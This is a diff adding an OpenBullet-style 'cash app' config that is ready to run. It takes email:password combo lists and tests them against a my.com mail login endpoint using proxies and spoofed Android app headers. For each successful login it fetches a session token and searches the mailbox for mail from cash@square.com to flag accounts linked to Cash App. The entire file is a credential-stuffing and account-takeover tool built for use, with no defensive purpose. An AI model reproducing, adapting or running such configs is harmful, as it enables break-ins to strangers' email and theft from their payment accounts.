@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "cash app Almadny",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-04T02:09:57.5146917+00:00",
+  "AdditionalInfo": "",
+  "Author": "Almadny",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#MAIL_ACCESS REQUEST GET "https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login=<USER>&Password=<PASS>" 
+  
+  HEADER "User-Agent: MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Ok=0" 
+    KEY "{\"Status\":\"Ok\",\"Continue\":\"" 
+  KEYCHAIN Success OR 
+    KEY "Ok=1" 
+
+#GET_TK REQUEST GET "https://aj-https.my.com/api/v1/tokens?email=<USER>&mp=android&mmp=mail&DeviceID=83d18a2c1320cfb07ea0433f8c5ca3a0&client=mobile&udid=1d8dea1a9d688a4c48df84a1a0f80919dff0fd224f1b56f03b2e9b883ea054d0&instanceid=cV9P7MnrQuU&playservices=211515038&connectid=4a93e679058284a39a7d6da21038cf5b&os=Android&os_version=10&ver=park.outlook.sign.in.client13.10.0.33031&appbuild=33031&vendor=Xiaomi&model=Redmi%207&device_type=Smartphone&country=EG&language=ar_EG&timezone=GMT%2B02%3A00&device_name=Xiaomi%20Redmi%207&idfa=1ddd5bfb-bd0e-4acc-83dd-9b03d7a0b368&appsflyerid=1622754626457-2804585269829934656&current=google&first=google&md5_signature=ae1109b8c8dab75015fdc9835166211a" 
+  
+  HEADER "User-Agent: mobmail android 13.10.0.33031 park.outlook.sign.in.client" 
+  HEADER "Host: aj-https.my.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#TK PARSE "<SOURCE>" JSON "token" -> VAR "tk" 
+
+#SERCH REQUEST GET "https://aj-https.my.com/api/v1/messages/search?correspondents=%7B%22from%22%3A%22%E2%80%8F%E2%80%AAcash%40square.com%E2%80%AC%E2%80%8F%22%7D&htmlencoded=false&limit=100&offset=0&snippet_limit=235&with_threads=true&email=<USER>&mp=android&mmp=mail&DeviceID=83d18a2c1320cfb07ea0433f8c5ca3a0&client=mobile&udid=8609a8d0be021760951667b7d27f78623ccc1d50e8658fd833819c4baae78d9a&instanceid=d6Lb5-u22uc&playservices=211515038&connectid=4a93e679058284a39a7d6da21038cf5b&os=Android&os_version=10&ver=park.outlook.sign.in.client13.10.0.33031&appbuild=33031&vendor=Xiaomi&model=Redmi%207&device_type=Smartphone&country=EG&language=ar_EG&timezone=GMT%2B02%3A00&device_name=Xiaomi%20Redmi%207&idfa=1ddd5bfb-bd0e-4acc-83dd-9b03d7a0b368&device_year=2013&connection_class=UNKNOWN&current=google&first=google&behaviorName=default%2Bstickers&appsflyerid=1622772123737-8789905666606653233&reqmode=fg&ExperimentID=Experiment_simple_signin&isExperiment=false&token=<tk>&md5_signature=63566ee951ae50b0cffbaee20a514121" 
+  
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: mobmail android 13.10.0.33031 park.outlook.sign.in.client" 
+  HEADER "Host: aj-https.my.com" 
+  HEADER "Connection: Keep-Alive" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "\":{\"found\":{\"count\":0" 
+    KEY "403"
+
+#Almadny FUNCTION Constant "@R_P_8" -> CAP "config by" 
